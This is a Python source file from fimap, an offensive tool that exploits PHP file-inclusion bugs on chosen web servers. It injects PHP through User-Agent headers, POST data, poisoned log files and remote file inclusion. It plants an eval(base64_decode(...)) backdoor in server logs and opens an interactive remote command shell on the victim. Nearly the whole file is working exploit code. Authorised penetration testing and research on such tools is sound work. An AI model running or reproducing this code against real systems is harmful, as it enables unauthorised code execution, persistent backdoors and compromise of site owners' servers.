#
# This file is part of fimap.
#
# Copyright(c) 2009 Iman Karim(ikarim2s@smail.inf.fh-brs.de).
# http://fimap.googlecode.com
#
# This file may be licensed under the terms of of the
# GNU General Public License Version 2 (the ``GPL'').
#
# Software distributed under the License is distributed
# on an ``AS IS'' basis, WITHOUT WARRANTY OF ANY KIND, either
# express or implied. See the GPL for the specific language
# governing rights and limitations.
#
# You should have received a copy of the GPL along with this
# program. If not, go to http://www.gnu.org/licenses/gpl.html
# or write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
#
import base64
import shutil
import os
import sys
from baseClass import baseClass
from config import settings
import urllib2

__author__="Iman Karim(ikarim2s@smail.inf.fh-brs.de)"
__date__ ="$03.09.2009 03:40:49$"

shell_banner =  "-------------------------------------------\n" + \
                "Welcome to fimap shell!\n" + \
                "Better don't start interactive commands! ;)\n" +\
                "Also remember that this is not a persistent shell.\n" +\
                "Every command opens a new shell and quits it after that!\n" +\
                "Enter 'q' to exit the shell.\n"+\
                "-------------------------------------------"


class codeinjector(baseClass):
    def _load(self):
        self.report = None
        self.isLogKickstarterPresent = False

    def setReport(self, report):
        self.report = report

    def testExecutionMethods(self):
        info_payload = self.settings["php_info"][0]
        info_pattern = self.settings["php_info"][1]
        
        #for k,v in self.settings["php_exec"]

    def start(self):
        domain = self.chooseDomains()
        vuln   = self.chooseVuln(domain.getAttribute("hostname"))

        hostname = domain.getAttribute("hostname")
        mode = vuln.getAttribute("mode")
        path = vuln.getAttribute("path")
        param = vuln.getAttribute("param")
        prefix = vuln.getAttribute("prefix")
        suffix = vuln.getAttribute("suffix")
        appendix = vuln.getAttribute("appendix")
        shcode = vuln.getAttribute("file")
        paramvalue = vuln.getAttribute("paramvalue")
        payload = "%s%s%s" %(prefix, shcode, suffix)
        path = path.replace("%s=%s" %(param, paramvalue), "%s=%s"%(param, payload))

        php_inject_works = False
        sys_inject_works = False
        working_shell    = None

        url  = "http://%s%s" %(hostname, path)

        code = None

        if (mode.find("A") != -1 and mode.find("x") != -1):
            self._log("Testing php-code injection thru User-Agent...", self.LOG_INFO)

        elif (mode.find("P") != -1 and mode.find("x") != -1):
            self._log("Testing php-code injection thru POST...", self.LOG_INFO)

        elif (mode.find("L") != -1):
            if (mode.find("H") != -1):
                self._log("Testing php-code injection thru Logfile HTTP-UA-Injection...", self.LOG_INFO)
            elif (mode.find("F") != -1):
                self._log("Testing php-code injection thru Logfile FTP-Username-Injection...", self.LOG_INFO)

        elif (mode.find("R") != -1):
            if settings["dynamic_rfi"]["mode"] == "ftp":
                self._log("Testing code thru FTP->RFI...", self.LOG_INFO)
                url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["ftp"]["http_map"]))
            elif settings["dynamic_rfi"]["mode"] == "local":
                self._log("Testing code thru LocalHTTP->RFI...", self.LOG_INFO)
                url  = url.replace("%s=%s"%(param, shcode), "%s=%s"%(param, settings["dynamic_rfi"]["local"]["http_map"]))
            else:
                print "fimap is currently not configured to exploit RFI vulnerabilitys."
                sys.exit(1)

        code = self.__doHaxRequest(url, mode, settings["php_info"][0], suffix)
        if code == None:
            self._log("php-code testing failed! code=None", self.LOG_ERROR)
            sys.exit(1)


        if (code.find(settings["php_info"][1]) != -1):
            self._log("PHP Injection works! Testing if execution works...", self.LOG_ALWAYS)
            php_inject_works = True
            for item in settings["php_exec"]:
                name, payload = item
                self._log("Testing execution thru '%s'..."%(name), self.LOG_INFO)
                testload = payload.replace("__PAYLOAD__", base64.b64encode(settings["shell_test"][0]))
                if (mode.find("A") != -1):
                    self.setUserAgent(testload)
                    code = self.doGetRequest(url)
                elif (mode.find("P") != -1):
                    code = self.doPostRequest(url, testload)
                elif (mode.find("R") != -1):
                    code = self.executeRFI(url, suffix, testload)
                elif (mode.find("L") != -1):
                    testload = self.convertUserloadToLogInjection(testload)
                    code = self.doPostRequest(url, testload)
                if code != None and code.find(settings["shell_test"][1]) != -1:
                    sys_inject_works = True
                    working_shell = item
                    self._log("Execution thru '%s' works!"%(name), self.LOG_INFO)
                    break

            attack = None
            while (attack != "q"):
                attack = self.chooseAttackMode(php=php_inject_works, syst=sys_inject_works)
                

                if (type(attack) == str):
                    if (attack == "fimap_shell"):
                        cmd = ""
                        print "Please wait - Setting up shell (one request)..."
                        pwd_cmd = payload.replace("__PAYLOAD__", base64.b64encode("pwd"))
                        curdir = self.__doHaxRequest(url, mode, pwd_cmd, suffix).strip()
                        print shell_banner

                        while 1==1:
                            cmd = raw_input("fimap_shell:%s$> " %curdir)
                            if cmd == "q" or cmd == "quit": break
                            
                            if (cmd.strip() != ""):
                                userload = payload.replace("__PAYLOAD__", base64.b64encode("cd '%s'; %s"%(curdir, cmd)))
                                code = self.__doHaxRequest(url, mode, userload, suffix)
                                if (cmd.startswith("cd ")):
                                    cmd = "cd '%s'; %s; pwd"%(curdir, cmd)
                                    cmd = payload.replace("__PAYLOAD__", base64.b64encode(cmd))
                                    curdir = self.__doHaxRequest(url, mode, cmd , suffix).strip()
                                print code.strip()
                        print "See ya dude!"
                        print "Do not forget to close this security hole."
                        sys.exit(0)
                    else:
                        print "Strange stuff..."
                else:
                    typ       = attack[0]
                    attack    = attack[1]

                    questions = attack[0]
                    cpayload   = attack[1]

                    if (questions != None):
                        for q, p in questions:
                            v = raw_input(q)
                            cpayload = cpayload.replace(p, v)

                    shellcode = None

                    if (typ=="php"):
                        shellcode = cpayload
                    elif (typ=="sys"):
                        shellcode = working_shell[1]
                        shellcode = shellcode.replace("__PAYLOAD__", base64.b64encode(cpayload))


                    code = self.__doHaxRequest(url, mode, shellcode, appendix)
                    if (code == None):
                        print "Exploiting Failed!"
                        sys.exit(1)
                    print code.strip()
        else:
            print "Failed to test php injection. :("


    def __doHaxRequest(self, url, m, payload, appendix=None):
        code = None
        rndStart = self.getRandomStr()
        rndEnd = self.getRandomStr()

        userload = "<? echo \"%s\"; ?> %s <? echo \"%s\"; ?>" %(rndStart, payload, rndEnd)
        if (m.find("A") != -1):
            self.setUserAgent(userload)
            code = self.doGetRequest(url)
        elif (m.find("P") != -1):
            code = self.doPostRequest(url, userload)
        elif (m.find("R") != -1):
            code = self.executeRFI(url, appendix, userload)
        elif (m.find("L") != -1):
            if (not self.isLogKickstarterPresent):
                self._log("Testing if log kickstarter is present...", self.LOG_INFO)
                testcode = self.getPHPQuiz()
                code = self.doPostRequest(url, "data=" + base64.b64encode(testcode[0]))
                if (code.find(testcode[1]) == -1):
                    self._log("Kickstarter is not present. Injecting kickstarter...", self.LOG_INFO)
                    kickstarter = "<? eval(base64_decode($_POST['data'])); ?>"
                    ua = self.getUserAgent()
                    self.setUserAgent(kickstarter)
                    tmpurl = url[:url.find("?")]
                    self.doGetRequest(tmpurl)
                    self.setUserAgent(ua)
                    
                    self._log("Testing once again if kickstarter is present...", self.LOG_INFO)
                    testcode = self.getPHPQuiz()
                    code = self.doPostRequest(url, "data=" + base64.b64encode(testcode[0]))

                    if (code.find(testcode[1]) == -1):
                        self._log("Failed to inject kickstarter!", self.LOG_ERROR)
                        sys.exit(1)
                    else:
                        self._log("Kickstarter successfully injected!", self.LOG_INFO)
                        self.isLogKickstarterPresent = True
                else:
                    self._log("Kickstarter found!", self.LOG_INFO)
                    self.isLogKickstarterPresent = True

            if (self.isLogKickstarterPresent):
                # Remove all <? and ?> tags.
                userload = self.convertUserloadToLogInjection(userload)
                code = self.doPostRequest(url, userload)

        if (code != None): code = code[code.find(rndStart)+len(rndStart): code.find(rndEnd)]
        return(code)

    def testRFI(self):
        c, r = self.getPHPQuiz()
        if (settings["dynamic_rfi"]["mode"] == "local"):
            print "Testing Local->RFI configuration..."
            code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"], "", c)
            if (code == c):
                print "Dynamic RFI works!"
                print "Testing if you have disabled .php interpreter..."
                settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["local"]["local_path"] + ".php"
                code = self.executeRFI(settings["dynamic_rfi"]["local"]["http_map"] + ".php", "", "<? %s ?>"%c)
                if (code == c):
                    print "ALL OK! You are ready to go!"
                elif (code == r):
                    print "WARNING! FILES WHICH ENDS WITH .php WILL BE EXECUTED ON YOUR SERVER! FIX THAT!"
            else:
                print "Failed! Something went wrong..."


        elif (settings["dynamic_rfi"]["mode"] == "ftp"):
            print "Testing FTP->RFI configuration..."
            code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"], "", c)
            if (code != None):
                code = code.strip()
                if (code == c):
                    print "Dynamic RFI works!"
                    print "Testing if you have disabled .php interpreter..."
                    settings["dynamic_rfi"]["ftp"]["ftp_path"] = settings["dynamic_rfi"]["ftp"]["ftp_path"] + ".php"
                    code = self.executeRFI(settings["dynamic_rfi"]["ftp"]["http_map"] + ".php", "", "<? %s ?>"%c)
                    if (code == c):
                        print "ALL OK! You are ready to go!"
                    elif (code == r):
                        print "WARNING! FILES WHICH ENDS WITH .php WILL BE EXECUTED ON YOUR SERVER! FIX THAT!"

                else:
                    print "Failed! Something went wrong..."
            else:
                print "Code == None. That's not good! Failed!"
        else:
            print "You haven't enabled and\\or configurated fimap RFI mode."
            print "Fix that in config.py"
            

    def convertUserloadToLogInjection(self, userload):
        userload = userload.replace("<?php", "").replace("?>", "")
        userload = userload.replace("<?", "")
        userload = "data=" + base64.b64encode(userload).replace("+", "%2B").replace("=", "%3D")
        return(userload)


    def chooseAttackMode(self, php=True, syst=True):
        header = ""
        choose = {}
        textarr = []
        idx = 1
        
        if (syst):
            header = ":: Available Attacks - PHP and SHELL access ::"
            textarr.append("[1] Spawn fimap shell")
            choose[1] = "fimap_shell"
            idx = 2
            for k,v in settings["payloads"]["php"].items():
                textarr.append("[%d] %s"%(idx,k))
                choose[idx] = ("php", v)
                idx = idx +1

            for k,v in settings["payloads"]["sys"].items():
                textarr.append("[%d] %s"%(idx,k))
                choose[idx] = ("sys",v)
                idx = idx +1

        else:
            header = ":: Available Attacks - PHP Only ::"
            for k,v in settings["payloads"]["php"].items():
                textarr.append("[%d] %s"%(idx,k))
                choose[idx] = ("php", v)
                idx = idx +1

        textarr.append("[q] Quit")
        self.drawBox(header, textarr)
        while (1==1):
            tech = raw_input("Choose Attack: ")
            try:
                if (tech.strip() == "q"):
                    sys.exit(0)
                tech = choose[int(tech)]
                return(tech)

            except Exception, err:
                print "Invalid attack. Press 'q' to break."
        
        
    def executeRFI(self, URL, appendix, content):
        if (appendix == "%00"): appendix = ""
        if settings["dynamic_rfi"]["mode"]=="ftp":
            up = self.FTPuploadFile(content, appendix)
            code = self.doGetRequest(URL)
            if up["dirstruct"]:
                self.FTPdeleteDirectory(up["ftp"])
            else:
                self.FTPdeleteFile(up["ftp"])
            return(code)
        elif settings["dynamic_rfi"]["mode"]=="local":
            up = self.putLocalPayload(content, appendix)
            code = self.doGetRequest(URL)
            self.deleteLocalPayload(up["local"])
            return(code)
            

    
    def chooseDomains(self, OnlyExploitable=True):
        choose = {}
        nodes = self.getDomainNodes()
        idx = 1
        header = ":: List of Domains ::"
        textarr = []
        for n in nodes:
            host = n.getAttribute("hostname")
            showit = False
            for child in self.getNodesOfDomain(host):
                mode = child.getAttribute("mode")
                if ("x" in mode):
                    showit = True
            if (showit or not OnlyExploitable):
                choose[idx] = n
                textarr.append("[%d] %s" %(idx, host))
                idx = idx +1

        textarr.append("[q] Quit")
        self.drawBox(header, textarr)
        
        while(1==1):
            c = raw_input("Choose Domain: ")
            if (c == "q"):
                sys.exit(0)
            try:
                c = int(c)
                ret = choose[c]
                return(ret)
            except:
                print "Invalid Domain ID."


    def chooseVuln(self, hostname):
        choose = {}
        nodes = self.getNodesOfDomain(hostname)
        doRemoteWarn = False

        idx = 1
        header = ":: FI Bugs on '" + hostname + "' ::"
        textarr = []
        for n in nodes:
            path = n.getAttribute("path")
            file = n.getAttribute("file")
            param = n.getAttribute("param")
            mode = n.getAttribute("mode")
            if (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] not in ("ftp", "local")):
                doRemoteWarn = True

            if (mode.find("x") != -1 or (mode.find("R") != -1 and settings["dynamic_rfi"]["mode"] in ("ftp", "local"))):
                choose[idx] = n
                textarr.append("[%d] URL: '%s' injecting file: '%s' using param: '%s'" %(idx, path, file, param))
                idx = idx +1

        if (idx == 1):
            if (doRemoteWarn):
                print "WARNING: Some bugs can not be used because dynamic_rfi is not configured!"
            print "This domain has no usable bugs."
            sys.exit(1)

        
        textarr.append("[q] Quit")
        self.drawBox(header, textarr)

        if (doRemoteWarn):
            print "WARNING: Some bugs are suppressed because dynamic_rfi is not configured!"

        while (1==1):
            c = raw_input("Choose vulnerable script: ")
            if (c == "q"):
                sys.exit(0)
            try:
                c = int(c)
                ret = choose[c]
                return(ret)
            except:
                print "Invalid script ID."